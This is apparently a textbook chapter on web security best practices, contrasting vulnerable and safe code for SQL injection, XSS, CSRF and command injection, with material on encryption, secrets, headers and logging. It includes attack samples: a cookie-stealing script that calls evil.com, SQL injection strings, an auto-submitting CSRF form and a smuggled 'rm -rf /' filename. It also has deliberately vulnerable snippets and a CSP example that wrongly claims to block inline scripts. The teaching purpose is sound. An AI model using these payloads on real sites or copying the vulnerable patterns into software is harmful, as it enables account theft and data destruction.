# Chapter 23: Security Best Practices

## Table of Contents
1. OWASP Top 10 Vulnerabilities
2. SQL Injection Prevention
3. Cross-Site Scripting (XSS) Prevention
4. Cross-Site Request Forgery (CSRF) Prevention
5. Encryption at Rest and in Transit
6. Secret Management
7. API Security
8. Input Validation and Sanitization
9. Security Headers
10. Secure Coding Practices
11. Security Auditing and Logging

---

## 1. OWASP Top 10 Vulnerabilities

### The OWASP Top 10 (2021)

1. **Broken Access Control**
2. **Cryptographic Failures**
3. **Injection**
4. **Insecure Design**
5. **Security Misconfiguration**
6. **Vulnerable and Outdated Components**
7. **Identification and Authentication Failures**
8. **Software and Data Integrity Failures**
9. **Security Logging and Monitoring Failures**
10. **Server-Side Request Forgery (SSRF)**

We'll cover the most critical ones in depth.

---

## 2. SQL Injection Prevention

### The Attack

```sql
-- User input: email = "admin@example.com' OR '1'='1"
-- Vulnerable query:
SELECT * FROM users WHERE email = 'admin@example.com' OR '1'='1'

-- Result: Returns ALL users (1=1 is always true)
```

### ❌ Vulnerable Code

```python
# BAD: String concatenation
def get_user_vulnerable(email):
    query = f"SELECT * FROM users WHERE email = '{email}'"
    cursor.execute(query)
    return cursor.fetchone()

# Attack: email = "' OR '1'='1' --"
# Query becomes: SELECT * FROM users WHERE email = '' OR '1'='1' --'
# Returns all users!
```

### ✅ Prevention: Parameterized Queries

```python
# GOOD: Parameterized queries
def get_user_safe(email):
    query = "SELECT * FROM users WHERE email = %s"
    cursor.execute(query, (email,))
    return cursor.fetchone()

# Attack fails: email = "' OR '1'='1' --"
# Database treats entire input as string value
# Query: SELECT * FROM users WHERE email = ''' OR ''1''=''1'' --'
# No users found (safe!)
```

### Implementation Examples

```javascript
// ============================================
// Node.js with Parameterized Queries
// ============================================

// ❌ Vulnerable
app.get('/api/users', (req, res) => {
  const email = req.query.email;
  const query = `SELECT * FROM users WHERE email = '${email}'`;  // BAD!
  db.query(query, (err, results) => {
    res.json(results);
  });
});

// ✅ Safe
app.get('/api/users', async (req, res) => {
  const email = req.query.email;
  const query = 'SELECT * FROM users WHERE email = $1';  // GOOD!
  const results = await db.query(query, [email]);
  res.json(results.rows);
});

// ============================================
// ORM (Sequelize) - Automatically Safe
// ============================================
const { Sequelize, DataTypes } = require('sequelize');

const User = sequelize.define('User', {
  email: DataTypes.STRING,
  name: DataTypes.STRING
});

// Safe by default
app.get('/api/users', async (req, res) => {
  const users = await User.findAll({
    where: {
      email: req.query.email  // Automatically parameterized
    }
  });
  res.json(users);
});
```

---

## 3. Cross-Site Scripting (XSS) Prevention

### The Attack

**Stored XSS:**
```javascript
// User submits comment with malicious script
comment = "<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>"

// Saved to database
// Later, when another user views the page:
<div class="comment">
  <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
</div>

// Script executes in victim's browser!
// Steals session cookie
```

**Reflected XSS:**
```
URL: https://example.com/search?q=<script>alert('XSS')</script>

Response:
<div>Search results for: <script>alert('XSS')</script></div>

// Script executes immediately
```

### ✅ Prevention: Output Encoding

```javascript
// ============================================
// React (Safe by Default)
// ============================================
function CommentComponent({ comment }) {
  // React automatically escapes
  return <div>{comment}</div>;
  
  // Even if comment = "<script>alert('XSS')</script>"
  // Rendered as text: &lt;script&gt;alert('XSS')&lt;/script&gt;
}

// ❌ Dangerous (bypasses escaping)
function DangerousComponent({ html }) {
  // Only use when you KNOW html is safe
  return <div dangerouslySetInnerHTML={{ __html: html }} />;
}

// ============================================
// Express.js with Templating
// ============================================
const express = require('express');
const escape = require('escape-html');

// ❌ Vulnerable
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<div>Results for: ${query}</div>`);  // XSS!
});

// ✅ Safe (escape output)
app.get('/search', (req, res) => {
  const query = escape(req.query.q);
  res.send(`<div>Results for: ${query}</div>`);
});

// ✅ Better (use templating engine)
app.set('view engine', 'ejs');

app.get('/search', (req, res) => {
  res.render('search', {
    query: req.query.q  // EJS automatically escapes
  });
});

// search.ejs
// <div>Results for: <%= query %></div>
```

### Content Security Policy (CSP)

```javascript
// ============================================
// CSP Headers
// ============================================
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "'unsafe-inline'", "https://cdn.example.com"],
    styleSrc: ["'self'", "'unsafe-inline'"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'", "https://api.example.com"],
    fontSrc: ["'self'", "https://fonts.gstatic.com"],
    objectSrc: ["'none'"],
    upgradeInsecureRequests: []
  }
}));

// CSP Header sent:
// Content-Security-Policy: 
//   default-src 'self'; 
//   script-src 'self' 'unsafe-inline' https://cdn.example.com;
//   ...

// Blocks:
// - Inline scripts from untrusted sources
// - Scripts from unauthorized domains
// - Eval() and similar dangerous functions
```

### DOMPurify (Sanitize HTML)

```javascript
// ============================================
// Sanitize User HTML Input
// ============================================
const DOMPurify = require('isomorphic-dompurify');

app.post('/api/comments', async (req, res) => {
  const { content } = req.body;
  
  // Sanitize HTML (remove scripts, dangerous attributes)
  const clean = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em', 'a'],
    ALLOWED_ATTR: ['href'],
    ALLOW_DATA_ATTR: false
  });
  
  // Store sanitized version
  await db.query(
    'INSERT INTO comments (content) VALUES ($1)',
    [clean]
  );
  
  res.json({ message: 'Comment posted' });
});

// Input: "<script>alert('XSS')</script><p>Hello</p>"
// Sanitized: "<p>Hello</p>"
// Script removed!
```

---

## 4. Cross-Site Request Forgery (CSRF) Prevention

### The Attack

```html
<!-- Evil website -->
<html>
<body>
  <!-- Hidden form that auto-submits -->
  <form action="https://bank.com/transfer" method="POST" id="evil">
    <input type="hidden" name="to" value="attacker_account" />
    <input type="hidden" name="amount" value="1000000" />
  </form>
  
  <script>
    document.getElementById('evil').submit();
  </script>
</body>
</html>

<!-- If user is logged into bank.com (has session cookie),
     this form submits with their credentials!
     Money transferred to attacker! -->
```

### ✅ Prevention: CSRF Tokens

```javascript
// ============================================
// CSRF Protection
// ============================================
const csurf = require('csurf');
const cookieParser = require('cookie-parser');

app.use(cookieParser());

// CSRF middleware
const csrfProtection = csurf({
  cookie: {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'
  }
});

// Render form with CSRF token
app.get('/transfer', csrfProtection, (req, res) => {
  res.render('transfer', {
    csrfToken: req.csrfToken()
  });
});

// transfer.ejs
/*
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>" />
  <input name="to" />
  <input name="amount" />
  <button>Transfer</button>
</form>
*/

// Verify CSRF token on POST
app.post('/transfer', csrfProtection, async (req, res) => {
  // CSRF token automatically verified by middleware
  // If token missing or invalid → 403 Forbidden
  
  const { to, amount } = req.body;
  await transferMoney(req.session.userId, to, amount);
  
  res.json({ message: 'Transfer successful' });
});
```

### SameSite Cookie Attribute

```javascript
// ============================================
// SameSite Cookies (Modern CSRF Protection)
// ============================================

app.use(session({
  cookie: {
    sameSite: 'strict',  // Only send cookie on same-site requests
    secure: true,        // HTTPS only
    httpOnly: true       // Not accessible via JavaScript
  }
}));

// SameSite values:
// - strict: Never sent on cross-site requests (most secure)
// - lax: Sent on top-level navigation (GET only)
// - none: Always sent (must use with Secure flag)
```

---

## 5. Encryption at Rest and in Transit

### Encryption in Transit (TLS/SSL)

```nginx
# ============================================
# Nginx HTTPS Configuration
# ============================================
server {
    listen 443 ssl http2;
    server_name api.example.com;
    
    # SSL certificate
    ssl_certificate /etc/nginx/ssl/cert.pem;
    ssl_certificate_key /etc/nginx/ssl/key.pem;
    
    # Modern SSL configuration
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256';
    ssl_prefer_server_ciphers on;
    
    # HSTS (force HTTPS)
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
    
    # Disable SSL session tickets
    ssl_session_tickets off;
    
    # OCSP Stapling
    ssl_stapling on;
    ssl_stapling_verify on;
    
    location / {
        proxy_pass http://backend;
    }
}

# Redirect HTTP to HTTPS
server {
    listen 80;
    server_name api.example.com;
    return 301 https://$server_name$request_uri;
}
```

### Encryption at Rest

```python
# ============================================
# Database Field Encryption
# ============================================
from cryptography.fernet import Fernet
import base64

class FieldEncryption:
    def __init__(self, encryption_key):
        """
        encryption_key: 32-byte key (base64 encoded)
        Generate with: Fernet.generate_key()
        """
        self.cipher = Fernet(encryption_key)
    
    def encrypt(self, plaintext):
        """Encrypt plaintext"""
        if isinstance(plaintext, str):
            plaintext = plaintext.encode('utf-8')
        
        ciphertext = self.cipher.encrypt(plaintext)
        return base64.b64encode(ciphertext).decode('utf-8')
    
    def decrypt(self, ciphertext):
        """Decrypt ciphertext"""
        ciphertext_bytes = base64.b64decode(ciphertext.encode('utf-8'))
        plaintext = self.cipher.decrypt(ciphertext_bytes)
        return plaintext.decode('utf-8')

# Initialize (store key in environment variable or KMS)
encryption = FieldEncryption(os.environ['ENCRYPTION_KEY'])

# ============================================
# Encrypt sensitive fields before storing
# ============================================
def create_user(name, email, ssn, credit_card):
    """Store user with encrypted sensitive fields"""
    
    # Encrypt sensitive data
    encrypted_ssn = encryption.encrypt(ssn)
    encrypted_cc = encryption.encrypt(credit_card)
    
    # Store in database
    cursor.execute("""
        INSERT INTO users (name, email, ssn_encrypted, credit_card_encrypted)
        VALUES (%s, %s, %s, %s)
    """, (name, email, encrypted_ssn, encrypted_cc))
    
    conn.commit()

def get_user_with_decryption(user_id):
    """Retrieve user and decrypt sensitive fields"""
    cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))
    user = cursor.fetchone()
    
    # Decrypt sensitive fields
    user['ssn'] = encryption.decrypt(user['ssn_encrypted'])
    user['credit_card'] = encryption.decrypt(user['credit_card_encrypted'])
    
    # Remove encrypted versions
    del user['ssn_encrypted']
    del user['credit_card_encrypted']
    
    return user
```

### AWS KMS for Key Management

```python
# ============================================
# AWS KMS Encryption
# ============================================
import boto3
import base64

class KMSEncryption:
    def __init__(self, key_id):
        self.kms = boto3.client('kms')
        self.key_id = key_id
    
    def encrypt(self, plaintext):
        """Encrypt using KMS"""
        response = self.kms.encrypt(
            KeyId=self.key_id,
            Plaintext=plaintext.encode('utf-8')
        )
        
        # Return base64 encoded ciphertext
        return base64.b64encode(response['CiphertextBlob']).decode('utf-8')
    
    def decrypt(self, ciphertext):
        """Decrypt using KMS"""
        ciphertext_blob = base64.b64decode(ciphertext.encode('utf-8'))
        
        response = self.kms.decrypt(
            CiphertextBlob=ciphertext_blob
        )
        
        return response['Plaintext'].decode('utf-8')

# Usage
kms = KMSEncryption('arn:aws:kms:us-east-1:123456789:key/12345678-1234-1234-1234-123456789012')

# Encrypt credit card
encrypted_cc = kms.encrypt('4111-1111-1111-1111')
# Store in database

# Decrypt when needed
cc_number = kms.decrypt(encrypted_cc)
```

---

## 6. Secret Management

### ❌ Bad Practices

```python
# DON'T DO THIS!

# 1. Hardcoded secrets
API_KEY = "sk_live_1234567890abcdef"  # Never hardcode!

# 2. Secrets in version control
# .env file committed to Git
DATABASE_PASSWORD=mysecretpassword

# 3. Secrets in logs
logger.info(f"Connecting with password: {password}")  # Leaked in logs!
```

### ✅ Good Practices

```python
# ============================================
# Environment Variables
# ============================================
import os

# Load from environment
DB_PASSWORD = os.environ.get('DB_PASSWORD')
API_KEY = os.environ.get('API_KEY')

if not DB_PASSWORD:
    raise ValueError("DB_PASSWORD environment variable not set")

# ============================================
# AWS Secrets Manager
# ============================================
import boto3
import json

class SecretManager:
    def __init__(self):
        self.client = boto3.client('secretsmanager')
        self.cache = {}
    
    def get_secret(self, secret_name):
        """Get secret from AWS Secrets Manager"""
        # Check cache
        if secret_name in self.cache:
            return self.cache[secret_name]
        
        # Retrieve from Secrets Manager
        response = self.client.get_secret_value(SecretId=secret_name)
        
        if 'SecretString' in response:
            secret = json.loads(response['SecretString'])
        else:
            secret = base64.b64decode(response['SecretBinary'])
        
        # Cache (refresh every hour in production)
        self.cache[secret_name] = secret
        
        return secret

# Usage
secrets = SecretManager()

db_credentials = secrets.get_secret('myapp/database')
# Returns: {"username": "admin", "password": "..."}

api_key = secrets.get_secret('myapp/stripe-key')
```

### HashiCorp Vault

```python
# ============================================
# HashiCorp Vault
# ============================================
import hvac

class VaultClient:
    def __init__(self, url, token):
        self.client = hvac.Client(url=url, token=token)
    
    def get_secret(self, path):
        """Read secret from Vault"""
        response = self.client.secrets.kv.v2.read_secret_version(
            path=path
        )
        return response['data']['data']
    
    def set_secret(self, path, secret_data):
        """Write secret to Vault"""
        self.client.secrets.kv.v2.create_or_update_secret(
            path=path,
            secret=secret_data
        )

# Usage
vault = VaultClient(
    url='https://vault.example.com',
    token=os.environ['VAULT_TOKEN']
)

# Get database credentials
db_creds = vault.get_secret('secret/database')
# Returns: {'username': 'admin', 'password': '...'}

# Database connection
conn = psycopg2.connect(
    host='localhost',
    database='myapp',
    user=db_creds['username'],
    password=db_creds['password']
)
```

---

## 7. API Security

### API Key Management

```typescript
// ============================================
// API Key Authentication
// ============================================
import crypto from 'crypto';

class APIKeyManager {
  async generateAPIKey(userId: string): Promise<string> {
    // Generate secure random key
    const apiKey = 'sk_' + crypto.randomBytes(32).toString('hex');
    
    // Hash before storing (like passwords)
    const hash = crypto
      .createHash('sha256')
      .update(apiKey)
      .digest('hex');
    
    // Store hash in database
    await db.query(
      'INSERT INTO api_keys (user_id, key_hash, created_at) VALUES ($1, $2, NOW())',
      [userId, hash]
    );
    
    // Return actual key (only time it's visible)
    return apiKey;
  }
  
  async validateAPIKey(apiKey: string): Promise<boolean> {
    // Hash provided key
    const hash = crypto
      .createHash('sha256')
      .update(apiKey)
      .digest('hex');
    
    // Look up in database
    const result = await db.query(
      'SELECT user_id FROM api_keys WHERE key_hash = $1',
      [hash]
    );
    
    return result.rows.length > 0;
  }
  
  async revokeAPIKey(apiKey: string): Promise<void> {
    const hash = crypto
      .createHash('sha256')
      .update(apiKey)
      .digest('hex');
    
    await db.query(
      'DELETE FROM api_keys WHERE key_hash = $1',
      [hash]
    );
  }
}

// Middleware
async function requireAPIKey(req, res, next) {
  const apiKey = req.headers['x-api-key'];
  
  if (!apiKey) {
    return res.status(401).json({ error: 'API key required' });
  }
  
  const valid = await apiKeyManager.validateAPIKey(apiKey);
  
  if (!valid) {
    return res.status(401).json({ error: 'Invalid API key' });
  }
  
  next();
}

// Protected API endpoint
app.get('/api/data', requireAPIKey, async (req, res) => {
  const data = await getData();
  res.json(data);
});
```

### Rate Limiting for API Security

```python
# ============================================
# Advanced Rate Limiting
# ============================================
import redis
from datetime import datetime, timedelta

class AdvancedRateLimiter:
    def __init__(self, redis_client):
        self.redis = redis_client
    
    def check_rate_limit(self, key, limits):
        """
        Check multiple rate limits
        limits: [(max_requests, window_seconds), ...]
        Example: [(10, 1), (100, 60), (1000, 3600)]
                 10 per second, 100 per minute, 1000 per hour
        """
        now = datetime.now().timestamp()
        
        for max_requests, window_seconds in limits:
            window_key = f"ratelimit:{key}:{window_seconds}"
            
            # Add current request
            self.redis.zadd(window_key, {now: now})
            
            # Remove old entries
            cutoff = now - window_seconds
            self.redis.zremrangebyscore(window_key, 0, cutoff)
            
            # Count requests in window
            count = self.redis.zcard(window_key)
            
            # Set expiry
            self.redis.expire(window_key, window_seconds)
            
            if count > max_requests:
                return {
                    'allowed': False,
                    'limit': max_requests,
                    'window': window_seconds,
                    'retry_after': cutoff + window_seconds - now
                }
        
        return {'allowed': True}

# Usage
limiter = AdvancedRateLimiter(redis_client)

@app.before_request
def rate_limit():
    api_key = request.headers.get('X-API-Key')
    
    if not api_key:
        return
    
    # Different limits for different endpoints
    if request.path.startswith('/api/expensive'):
        limits = [(5, 60)]  # 5 per minute
    else:
        limits = [(100, 1), (1000, 60), (10000, 3600)]
    
    result = limiter.check_rate_limit(api_key, limits)
    
    if not result['allowed']:
        return jsonify({
            'error': 'Rate limit exceeded',
            'retry_after': result['retry_after']
        }), 429
```

---

## 8. Input Validation and Sanitization

### Validation

```typescript
// ============================================
// Input Validation with Joi
// ============================================
import Joi from 'joi';

// Define schema
const userSchema = Joi.object({
  email: Joi.string()
    .email()
    .required()
    .messages({
      'string.email': 'Invalid email format',
      'any.required': 'Email is required'
    }),
  
  password: Joi.string()
    .min(8)
    .pattern(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-Za-z\d@$!%*?&]/)
    .required()
    .messages({
      'string.min': 'Password must be at least 8 characters',
      'string.pattern.base': 'Password must contain uppercase, lowercase, number, and special character'
    }),
  
  age: Joi.number()
    .integer()
    .min(13)
    .max(120),
  
  website: Joi.string()
    .uri()
    .optional()
});

// Validation middleware
function validateRequest(schema: Joi.ObjectSchema) {
  return (req: any, res: any, next: any) => {
    const { error, value } = schema.validate(req.body, {
      abortEarly: false  // Return all errors
    });
    
    if (error) {
      return res.status(400).json({
        error: 'Validation failed',
        details: error.details.map(d => ({
          field: d.path.join('.'),
          message: d.message
        }))
      });
    }
    
    // Replace req.body with validated/sanitized value
    req.body = value;
    next();
  };
}

// Usage
app.post('/api/users',
  validateRequest(userSchema),
  async (req, res) => {
    // req.body is validated and safe
    const user = await createUser(req.body);
    res.json(user);
  }
);
```

### SQL Injection Prevention Summary

```javascript
// ============================================
// Comprehensive SQL Injection Prevention
// ============================================

// ✅ 1. Parameterized queries (BEST)
db.query('SELECT * FROM users WHERE email = $1', [email]);

// ✅ 2. ORM/Query Builder
User.findOne({ where: { email: email } });

// ✅ 3. Whitelist validation
const allowedColumns = ['name', 'email', 'created_at'];
const sortBy = allowedColumns.includes(req.query.sort) 
  ? req.query.sort 
  : 'created_at';

db.query(`SELECT * FROM users ORDER BY ${sortBy}`);  // Safe because whitelisted

// ✅ 4. Escape if absolutely necessary (last resort)
const escaped = db.escape(userInput);

// ❌ Never concatenate user input
const query = `SELECT * FROM users WHERE email = '${email}'`;  // NEVER!
```

---

## 9. Security Headers

### Essential Security Headers

```javascript
// ============================================
// Security Headers with Helmet.js
// ============================================
const helmet = require('helmet');

app.use(helmet({
  // 1. Content Security Policy
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "https://cdn.example.com"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      imgSrc: ["'self'", "data:", "https:"],
      connectSrc: ["'self'", "https://api.example.com"],
      fontSrc: ["'self'", "https://fonts.gstatic.com"],
      objectSrc: ["'none'"],
      mediaSrc: ["'self'"],
      frameSrc: ["'none'"]
    }
  },
  
  // 2. X-Content-Type-Options (prevent MIME sniffing)
  noSniff: true,
  
  // 3. X-Frame-Options (prevent clickjacking)
  frameguard: {
    action: 'deny'
  },
  
  // 4. X-XSS-Protection
  xssFilter: true,
  
  // 5. Strict-Transport-Security (force HTTPS)
  hsts: {
    maxAge: 31536000,  // 1 year
    includeSubDomains: true,
    preload: true
  },
  
  // 6. Referrer-Policy
  referrerPolicy: {
    policy: 'strict-origin-when-cross-origin'
  },
  
  // 7. Permissions-Policy (formerly Feature-Policy)
  permittedCrossDomainPolicies: {
    permittedPolicies: 'none'
  }
}));

// Custom headers
app.use((req, res, next) => {
  // Remove powered-by header
  res.removeHeader('X-Powered-By');
  
  // Add custom security headers
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  
  next();
});
```

---

## 10. Secure Coding Practices

### Password Hashing

```python
# ============================================
# Secure Password Hashing
# ============================================
import bcrypt

class PasswordManager:
    @staticmethod
    def hash_password(password):
        """Hash password with bcrypt"""
        # Generate salt and hash
        salt = bcrypt.gensalt(rounds=12)  # 2^12 iterations
        hashed = bcrypt.hashpw(password.encode('utf-8'), salt)
        return hashed.decode('utf-8')
    
    @staticmethod
    def verify_password(password, hashed):
        """Verify password against hash"""
        return bcrypt.checkpw(
            password.encode('utf-8'),
            hashed.encode('utf-8')
        )
    
    @staticmethod
    def is_strong_password(password):
        """Check password strength"""
        if len(password) < 8:
            return False, "Password must be at least 8 characters"
        
        has_upper = any(c.isupper() for c in password)
        has_lower = any(c.islower() for c in password)
        has_digit = any(c.isdigit() for c in password)
        has_special = any(c in '@$!%*?&' for c in password)
        
        if not (has_upper and has_lower and has_digit and has_special):
            return False, "Password must contain uppercase, lowercase, number, and special character"
        
        # Check against common passwords
        common_passwords = ['password', '123456', 'qwerty']
        if password.lower() in common_passwords:
            return False, "Password is too common"
        
        return True, "Password is strong"

# Usage
# Create user
password = "MySecureP@ssw0rd"
is_strong, message = PasswordManager.is_strong_password(password)

if not is_strong:
    return {"error": message}, 400

hashed = PasswordManager.hash_password(password)
db.execute(
    "INSERT INTO users (email, password_hash) VALUES (%s, %s)",
    (email, hashed)
)

# Login
user = db.query("SELECT password_hash FROM users WHERE email = %s", (email,))
if PasswordManager.verify_password(password, user['password_hash']):
    # Password correct
    pass
```

### Preventing Command Injection

```python
# ============================================
# Command Injection Prevention
# ============================================
import subprocess
import shlex

# ❌ Vulnerable
def resize_image_vulnerable(filename):
    # If filename = "image.jpg; rm -rf /"
    # Executes: convert image.jpg resized.jpg; rm -rf /
    command = f"convert {filename} resized.jpg"
    subprocess.call(command, shell=True)  # DANGEROUS!

# ✅ Safe (use list, no shell)
def resize_image_safe(filename):
    # Validate filename
    if not filename.endswith(('.jpg', '.png', '.gif')):
        raise ValueError("Invalid file type")
    
    # Remove path traversal
    filename = os.path.basename(filename)
    
    # Use list (no shell interpretation)
    subprocess.run([
        'convert',
        filename,
        'resized.jpg'
    ], check=True)

# ✅ Even safer (whitelist allowed values)
def resize_image_whitelist(file_id):
    # Only allow pre-approved files
    allowed_files = {
        'file_1': 'image1.jpg',
        'file_2': 'image2.jpg'
    }
    
    if file_id not in allowed_files:
        raise ValueError("Invalid file ID")
    
    filename = allowed_files[file_id]
    
    subprocess.run(['convert', filename, 'resized.jpg'], check=True)
```

---

## 11. Security Auditing and Logging

### Security Event Logging

```typescript
// ============================================
// Security Audit Logger
// ============================================

enum SecurityEventType {
  LOGIN_SUCCESS = 'LOGIN_SUCCESS',
  LOGIN_FAILURE = 'LOGIN_FAILURE',
  PASSWORD_CHANGE = 'PASSWORD_CHANGE',
  PERMISSION_DENIED = 'PERMISSION_DENIED',
  API_KEY_CREATED = 'API_KEY_CREATED',
  API_KEY_REVOKED = 'API_KEY_REVOKED',
  DATA_ACCESS = 'DATA_ACCESS',
  DATA_MODIFICATION = 'DATA_MODIFICATION',
  SUSPICIOUS_ACTIVITY = 'SUSPICIOUS_ACTIVITY'
}

interface SecurityEvent {
  type: SecurityEventType;
  userId?: string;
  ipAddress: string;
  userAgent: string;
  resource?: string;
  action?: string;
  success: boolean;
  metadata?: any;
  timestamp: Date;
}

class SecurityAuditLogger {
  async log(event: SecurityEvent): Promise<void> {
    // Store in database
    await db.query(`
      INSERT INTO security_audit_log 
      (type, user_id, ip_address, user_agent, resource, action, success, metadata, timestamp)
      VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9)
    `, [
      event.type,
      event.userId,
      event.ipAddress,
      event.userAgent,
      event.resource,
      event.action,
      event.success,
      JSON.stringify(event.metadata),
      event.timestamp
    ]);
    
    // Also log to external SIEM (Security Information and Event Management)
    await this.sendToSIEM(event);
    
    // Alert on suspicious patterns
    if (event.type === SecurityEventType.LOGIN_FAILURE) {
      await this.checkBruteForce(event.ipAddress, event.userId);
    }
  }
  
  private async checkBruteForce(ipAddress: string, userId?: string): Promise<void> {
    // Check failed login attempts from same IP
    const recentFailures = await db.query(`
      SELECT COUNT(*) as count
      FROM security_audit_log
      WHERE type = 'LOGIN_FAILURE'
        AND ip_address = $1
        AND timestamp > NOW() - INTERVAL '15 minutes'
    `, [ipAddress]);
    
    if (recentFailures.rows[0].count > 5) {
      // Possible brute force attack
      await this.alert({
        severity: 'HIGH',
        message: `Possible brute force attack from IP ${ipAddress}`,
        count: recentFailures.rows[0].count
      });
      
      // Block IP temporarily
      await this.blockIP(ipAddress, duration: 3600);  // 1 hour
    }
  }
}

// Usage
const auditLogger = new SecurityAuditLogger();

// Log successful login
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await authenticateUser(email, password);
  
  if (user) {
    await auditLogger.log({
      type: SecurityEventType.LOGIN_SUCCESS,
      userId: user.id,
      ipAddress: req.ip,
      userAgent: req.headers['user-agent'],
      success: true,
      timestamp: new Date()
    });
    
    res.json({ token: generateToken(user) });
  } else {
    await auditLogger.log({
      type: SecurityEventType.LOGIN_FAILURE,
      ipAddress: req.ip,
      userAgent: req.headers['user-agent'],
      success: false,
      metadata: { email },
      timestamp: new Date()
    });
    
    res.status(401).json({ error: 'Invalid credentials' });
  }
});
```

---

## Chapter 23 Summary

### Key Concepts

1. **OWASP Top 10** - Most critical web vulnerabilities
2. **SQL Injection** - Prevent with parameterized queries
3. **XSS** - Prevent with output encoding
4. **CSRF** - Prevent with tokens or SameSite cookies
5. **Encryption** - At rest (AES) and in transit (TLS)
6. **Secret Management** - AWS Secrets Manager, Vault
7. **API Security** - API keys, rate limiting
8. **Input Validation** - Whitelist, sanitize
9. **Security Headers** - CSP, HSTS, X-Frame-Options
10. **Audit Logging** - Track security events

### Security Checklist

**Authentication:**
- [ ] Strong password requirements
- [ ] Password hashing with bcrypt/argon2
- [ ] MFA for sensitive operations
- [ ] Account lockout after failed attempts
- [ ] Session timeout
- [ ] Secure token generation

**Authorization:**
- [ ] Principle of least privilege
- [ ] Role-based access control
- [ ] Authorization checks on every request
- [ ] No authorization bypass

**Data Protection:**
- [ ] HTTPS everywhere
- [ ] Sensitive data encrypted at rest
- [ ] Secrets in vault, not code
- [ ] PII handling compliance

**Input/Output:**
- [ ] Input validation
- [ ] Output encoding
- [ ] Parameterized queries
- [ ] File upload restrictions

**Headers:**
- [ ] CSP configured
- [ ] HSTS enabled
- [ ] X-Frame-Options set
- [ ] X-Content-Type-Options set

**Monitoring:**
- [ ] Security audit logging
- [ ] Failed login monitoring
- [ ] Unusual activity alerts
- [ ] Regular security scans

### Interview Tips

**Common Questions:**
1. "Explain OWASP Top 10"
2. "How do you prevent SQL injection?"
3. "What is XSS and how to prevent it?"
4. "How do you store passwords securely?"
5. "Explain defense in depth"

**How to Answer:**
- Give concrete examples with code
- Show vulnerable vs secure code
- Discuss multiple layers of security
- Mention standards (OWASP, NIST)
- Talk about tools (Helmet, CSP, bcrypt)

### Next Steps

Chapter 24 will cover **Network Security** - VPCs, subnets, security groups, firewalls, DDoS protection, and Zero Trust architecture.